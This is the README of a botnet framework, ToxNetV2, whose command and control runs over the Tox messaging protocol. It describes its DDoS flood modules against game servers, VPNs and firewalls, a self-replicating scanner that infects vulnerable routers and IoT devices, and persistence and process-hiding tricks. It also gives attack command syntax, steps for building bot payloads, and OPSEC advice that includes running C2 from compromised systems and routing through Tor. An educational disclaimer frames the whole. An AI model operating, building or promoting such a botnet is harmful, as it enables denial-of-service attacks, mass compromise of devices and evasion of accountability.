# ToxNetV2 P2P Botnet Framework
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/go-1.21-blue.svg)](https://golang.org/)
[![Tox Protocol](https://img.shields.io/badge/Tox-C2-green.svg)](https://tox.chat/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)](https://github.com)
[![Architecture](https://img.shields.io/badge/arch-ARM%20%7C%20MIPS%20%7C%20x86-red.svg)](https://github.com)

---
## ⚠️ Legal Disclaimer
**This tool is for educational and authorized security testing purposes only. Unauthorized use of this software for attacking systems without consent is illegal. The authors assume no liability for misuse or damage caused by this software.**

---
## 🎯 Overview
**Toxnet** is a modern, decentralized Command and Control (C2) framework built on the Tox encrypted messaging protocol. Unlike traditional HTTP-based C2 infrastructure that relies on central servers vulnerable to seizure and monitoring, ToxNetV2 operates on a peer-to-peer network where every node acts as both a potential relay and endpoint.

The C2 server acts as a relay between the operator and the botnet. Operators connect to the C2 using any standard Tox client, sending commands as encrypted messages. The C2 validates the operator's public key, then forwards commands to the botnet and relays responses back. All C2 traffic routes through Tor for complete operator anonymity.

This architecture makes the system inherently resistant to censorship, network monitoring, and infrastructure takedowns. The framework is designed for security research, demonstrating advanced concepts in network communication, cross-platform payload generation, and stealth persistence mechanisms.

### Why Tox?
- **Decentralized**: No central server to seize or block
- **Encrypted by default**: All communications are end-to-end encrypted
- **NAT traversal**: Built-in UDP hole punching for connectivity behind firewalls
- **Anonymity friendly**: Works seamlessly with Tor and VPNs
- **Resilient**: Bootstraps from multiple public nodes automatically

---
## 🚀 Key Features
### 🔐 Stealth & Persistence
| Feature | Description |
|---------|-------------|
| **Process Hiding** | Masquerades as kernel worker threads `[kworker/0:0]` |
| **Systemd Services** | Automatic startup and restart on modern Linux systems |
| **Cron Jobs** | Reboot execution + 5-minute intervals for redundancy |
| **rc.local Integration** | Legacy system support for older distributions |
| **Single Instance Enforcement** | File locking prevents duplicate execution |
| **Randomized Bot Names** | Unique, human-like identifiers for each bot |

### 💻 Cross-Platform Support
**Linux Architectures:**
- x86_64 (native)
- i386
- ARMv7 (hard float)
- ARMv5 (soft float)
- ARM64 (AArch64)
- MIPS (big endian)
- MIPSEL (little endian)
- MIPS64EL
- PPC64EL
- S390X

---
## ⚔️ Attack Modules
### UDP Attacks
| Attack | Description | Target |
|--------|-------------|--------|
| **VSE** | Source Engine query flood | Game servers (Steam, CS:GO, TF2) |
| **UDPTS** | TeamSpeak 3 protocol flood | TeamSpeak voice servers |
| **RakNet** | RakNet protocol flood | Minecraft, game servers |
| **OpenVPN** | OpenVPN protocol flood | VPN infrastructure |
| **UDP Hex** | Custom hex payload flood | Generic UDP services |
| **UDP Raw** | Raw IP packet flood | Firewall bypass attempts |
| **UDP Plain** | Standard UDP flood | Any UDP service |
| **UDP Bypass** | TCP handshake + UDP flood | Advanced firewall evasion |

### TCP Attacks
| Attack | Description | Target |
|--------|-------------|--------|
| **WRA** | Advanced SYN flood with TCP options | Firewalls, routers |
| **TCP SYN** | Standard SYN flood | Any TCP service |
| **TCP ACK** | ACK flood with payload | Stateful firewalls |
| **TCP SYN Data** | SYN packets with data payload | Deep packet inspection systems |
| **TCP Socket** | Connection flood | Web servers, databases |
| **TCP Socket Hold** | Long-lived connection hold | Connection-limited services |
| **TCP Bypass** | Slowloris-style connection handling | Apache, nginx |
| **TCP Stomp** | Advanced connection termination | Load balancers |
| **Brazilian Handshake** | Complex TCP handshake flood | High-end firewalls |

### 🌐 Self-Replication Scanner
The self-replication module automatically scans for vulnerable IoT devices and deploys the bot across the internet:

**Supported Vulnerabilities:**
- **GPON Routers** (multiple IP ranges)
- **Realtek SDK** vulnerabilities
- **Netgear** router exploits
- **Huawei** device exploits
- **TR-064** protocol vulnerabilities
- **HNAP** protocol exploits
- **D-Link** router vulnerabilities
- **Various IoT devices** with default credentials

---
## 🏗 Architecture
### Communication Flow

```
[Operator] → [Tox Client] → [Tor Network] → [C2 Server] → [Botnet]
     ↑            ↑              ↑              ↑            ↑
  Encrypted   Encrypted      Anonymized     Encrypted    Encrypted
   Message     Message        Traffic        Relay        Command
```

**Explanation:**

**1.  Admin → C2**: Send encrypted command via Tox.
    
**2.  C2 → Botnet**: C2 validates admin key, then relays command to all bots or a specific one.
    
**3.  Bot → C2**: Bots execute the command and return output.
    
**4.  C2 → Admin**: C2 aggregates and sends the results back.

---
## 🎮 Command Structure

### Bot Management Commands

`help`
**Show all available commands**

`help atk`
**Display all attack methods**

`list`
**List online bots with numbers and names**

`names`
**Show all bots with their status messages**

`stats`
**Display bot statistics (online count, platform breakdown)**

`exec <BOT> <CMD>`
**Execute command on specific bot**

`mass <CMD>`
**Mass execute command on all bots**

`masslinux <CMD>`
**Execute command on Linux bots only**

`masswin <CMD>`
**Execute command on Windows bots only**

### Attack Commands Format
All attack commands follow a consistent pattern:

```
[ATTACK_NAME] <TARGET_IP> [PORT] <THREADS> <DURATION> [LENGTH] [BOT_ID]
```

**Parameters:**
- `TARGET_IP`: Destination IP address
- `PORT`: Target port (required for protocol-specific attacks)
- `THREADS`: Number of concurrent attack threads
- `DURATION`: Attack duration in seconds
- `LENGTH`: Packet payload length (for variable-length attacks)
- `BOT_ID`: Optional specific bot ID for targeted attacks

### Attack Command Examples

**VSE**
`vse 1.2.3.4 100 60`

**UDPTS**
`udpts 1.2.3.4 9987 50 30`

**TCP SYN**
`tcp_syn 1.2.3.4 80 200 120`

**WRA**
`wra 1.2.3.4 443 150 60`

**Brazilian**
`brazilian 1.2.3.4 8080 100 30 512`

**Targeted Attack**
`vse 1.2.3.4 100 60 42`

### Self-Replication Commands

**Command** | **Description**
`startscan [BOT]` | **Start the self-replicating scanner**
`stopscan [BOT]` | **Stop all scanning activity**

---
## 🧅 Tor Anonymity
ToxNetV2 includes comprehensive Tor integration for complete operator anonymity:

**Features:**
- **Transparent Proxy**: All C2 traffic routed through Tor automatically
- **DNS over Tor**: Prevents DNS leaks that could expose operator identity
- **Circuit Management**: Automatic Tor circuit configuration and monitoring
- **One-Command Setup**: Automated Tor installation and configuration

**The `tor.sh` script automates:**
1.  Tor installation and dependency checking
2.  Transparent proxy configuration
3.  iptables rules for traffic redirection
4.  Tor service startup with proper bootstrap
5.  C2 launch with all traffic anonymized
6.  Cleanup and configuration restoration on exit

---
## 📁 Project Structure
```
toxnetV2/
├── main.go                    # Main C2 server entry point
├── go.mod                     # Go module definition
├── go.sum                     # Go dependencies checksum
├── net/                       # Core networking components
│   ├── init.go               # Tox initialization
│   ├── config.go             # Configuration management
│   ├── admin.go              # Admin command handling
│   ├── usage.go              # CLI usage and help
│   └── generate.go           # Payload generation
├── payloads/                  # Attack payload implementations
│   ├── linux.go              # Linux persistence mechanisms
│   ├── attacks.go            # Attack coordination
│   ├── selfrep.go            # Self-replication scanner
│   ├── vse.go                # VSE attack implementation
│   ├── wra.go                # WRA attack implementation
│   ├── udpts.go              # UDP TeamSpeak attack
│   ├── udp_raknet.go         # RakNet attack
│   ├── udp_openvpn.go        # OpenVPN attack
│   ├── tcp_syn.go            # TCP SYN flood
│   ├── tcp_ack.go            # TCP ACK flood
│   ├── tcp_syn_data.go       # TCP SYN with data
│   ├── tcp_socket.go         # TCP socket flood
│   ├── tcp_socket_hold.go    # TCP connection hold
│   ├── tcp_bypass.go         # TCP bypass attack
│   ├── tcp_stomp.go          # TCP stomp attack
│   ├── tcp_brazilian_handshake.go  # Brazilian handshake
│   ├── udp_hex.go            # UDP hex flood
│   ├── udp_raw.go            # UDP raw flood
│   ├── udp_plain.go          # UDP plain flood
│   └── udp_bypass.go         # UDP bypass attack
├── cross_libs/               # Cross-compilation libraries
├── bots/                     # Pre-built bot binaries
├── build.sh                  # Main build script
├── build_mips_libs.sh        # MIPS library build script
├── xcompile_libs.sh          # Cross-compilation library setup
├── Xcompiletools.sh          # Cross-compilation tool installation
├── test.sh                   # Testing script
├── tor.sh                    # Tor anonymization script
├── nig.sh                    # Additional utility script
└── toxcore-0.2.22/           # Embedded Toxcore library
```

---
## 🔒 Security Considerations

### Strengths
| Feature | Benefit |
|---------|---------|
| **Decentralized C2** | No single point of failure; network survives takedowns |
| **End-to-End Encryption** | All communications encrypted via Tox protocol |
| **Stealth Features** | Process hiding, randomized names, kernel masquerading |
| **Persistence** | Multiple redundant methods ensure continuity |
| **Multi-Architecture** | Broad device coverage from servers to routers |
| **Tor Integration** | Complete anonymity option for operator |
| **Relay Architecture** | Operator never communicates directly with bots |

### Operational Security (OPSEC) Recommendations
- **Infrastructure**: Use dedicated VPS or compromised systems for C2
- **Anonymity**: Always use Tor for C2 connections; never operate from personal IP
- **Identity Management**: Rotate Tox identities periodically
- **Access Control**: Limit admin access to specific public keys
- **Monitoring**: Regularly audit botnet size and activity patterns
- **Communication**: Use encrypted channels for command coordination

---
## ⭐ Project Highlights

### What Makes ToxNetV2 Special?

**1. True Decentralization**  
Unlike traditional C2 that relies on central servers, ToxNetV2 uses the Tox DHT network. There is no central server to seize, no domain to sinkhole, no IP to block. The network heals itself as nodes come and go.

**2. Operator Anonymity**  
Operators never communicate directly with bots. All commands pass through the C2 relay, which routes all traffic through Tor. The operator's identity is protected at every layer.

**3. Relay-Based Architecture**  
The C2 acts as a pure relay between the operator and the botnet. Operators connect using standard Tox clients, sending commands as friend messages. The C2 validates admin keys, forwards commands, and aggregates responses.

**4. Multi-Architecture Excellence**  
From x86_64 servers to MIPS-based routers, ToxNetV2 can run on virtually any Linux device. The cross-compilation system generates payloads for over ten architectures from a single build environment.

**5. Comprehensive Attack Suite**  
Over 20 distinct attack methods covering UDP floods, TCP floods, and application-layer attacks. Each method targets specific protocol vulnerabilities and evasion techniques.

**6. Self-Replication Capability**  
Automatic scanning and infection of vulnerable IoT devices enables exponential botnet growth. The scanner targets multiple known vulnerabilities across GPON routers, Realtek SDK, Netgear, Huawei, and other embedded devices.

**7. Stealth & Persistence**  
Multiple persistence methods ensure the bot survives reboots and system updates. Process hiding masquerades as kernel threads, while randomized names prevent tracking.

**8. Encrypted Communications**  
All C2 traffic is encrypted via the Tox protocol, avoiding plaintext detection and preventing eavesdropping on command channels.

**9. Admin Flexibility**  
Multiple admin support with granular targeting. Commands can be broadcast to all bots, filtered by platform, or directed to specific individual bots.

**10. Modern Codebase**  
Written in Go for memory safety and concurrency, with a clean modular design that separates concerns and facilitates extension.

**11. Educational Value**  
Demonstrates modern C2 techniques, peer-to-peer networking, malware engineering, and security research concepts in a well-documented, accessible framework.

---
## 📦 Installation & Setup

### Prerequisites
Before building ToxNetV2, you need to install the following dependencies:

#### For Ubuntu/Debian:
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Go (using snap for latest version)
sudo snap install go --classic

# Install essential build tools and dependencies
sudo apt install -y build-essential git curl wget

# Install libsodium and toxcore dependencies
sudo apt install -y libsodium-dev libsodium23 libtool autoconf automake cmake pkg-config

# Install cross-compilation toolchains
./Xcompiletools.sh for a simple all in one crosscompiler install or manually.
sudo apt install -y gcc-aarch64-linux-gnu gcc-arm-linux-gnueabi gcc-arm-linux-gnueabihf \
                    gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64 \
                    gcc-powerpc64le-linux-gnu gcc-s390x-linux-gnu gcc-i686-linux-gnu

# Install Tor for anonymity (optional but recommended)
sudo apt install -y tor
```

#### For Other Linux Distributions:
Adjust package manager commands accordingly (yum, dnf, pacman, etc.).

### Building ToxNetV2

1. **Clone and enter the repository:**
   ```bash
   git clone <repository-url>
   cd toxnetV2
   ```
2. **Edit Tox ID in net/config.go :**
   ```bash
     var Admins = []string{"YOUR QTOX ID HERE"}
   ```

3. **Build the C2 server:**
   ```bash
   go build -o toxnet-c2 main.go
   ```

4. **Set up cross-compilation libraries:**
   ```bash
   # Run the cross-compilation setup script
   ./xcompile_libs.sh
   
   # If MIPS libraries are needed
   ./build_mips_libs.sh
   ```


5. **Generate bot payloads:**
   ```bash
   # Generate Linux payload stub
   ./toxnet-c2 -t linux -o bot_stub
   
   # Build cross-platform bots
   ./build.sh
   ```
### Running with Tor Anonymity
For maximum operational security, run the C2 through Tor:

```bash
# Make the script executable
chmod +x tor.sh

# Run with Tor (requires root for transparent proxy)
sudo ./tor.sh
```

### Quick Start
1. Build the C2 server: `go build -o toxnet-c2 main.go`
2. Run the C2: `./toxnet-c2`
3. Note your Tox ID displayed in the console
4. Add this Tox ID as a friend in any Tox client (qTox, uTox, etc.)
5. Send commands as friend messages

---
## 📄 License
This project is licensed under the MIT License - see the LICENSE file for details.

---
## ⚠️ Final Warning

**This software is for educational purposes only.** Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. The authors assume no responsibility for misuse, damage, or legal consequences arising from the use of this software.

_Understanding how these systems work is essential to defending against them. Use this knowledge responsibly._
